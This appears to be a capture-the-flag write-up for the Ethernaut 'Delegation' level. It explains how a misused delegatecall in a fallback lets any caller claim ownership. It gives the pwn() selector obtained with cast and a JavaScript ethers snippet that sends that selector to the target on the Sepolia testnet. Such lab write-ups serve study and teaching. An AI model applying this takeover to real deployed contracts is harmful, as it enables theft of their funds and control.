### Goals

Claim ownership of the contract

### Exploit

The delegate call is very powerful function but with great power comes great responsibilites. The **delegatecall** calls other contract persisting it's storage, however executing function with implementation at called contract. This when misused can be very dangerous.

This level consists of two contract. Delegate is basic Ownable contract that allows setting owner to anyone that call `pwn()`. Delegation is delegating to a Delegate with calldata passed in call. We will leverage this to call `Delegate::pwn()` through `Delegation::falback()`

### Code

To exploit this contract we will again use JS some snippet.

First we will need to get signature of `pwn()`, we can use cast which is shipped with foundry.

```code
❯ cast sig "pwn()"
0xdd365b8b
```

```code
import { ethers } from "ethers";

let provider = new ethers.JsonRpcProvider(
  "https://ethereum-sepolia.publicnode.com"
);

const signer = new ethers.Wallet(
  "YOUR_PRV_KET",
  provider
);

let tx = await signer.sendTransaction({
  to: "FALLBACK_ADDRESS",
  data: "0xdd365b8b",
  gasLimit: 100_000,
});
await tx.wait();
console.log(`tx: ${tx.hash}`);

```

We are now the owner of contract

Done!
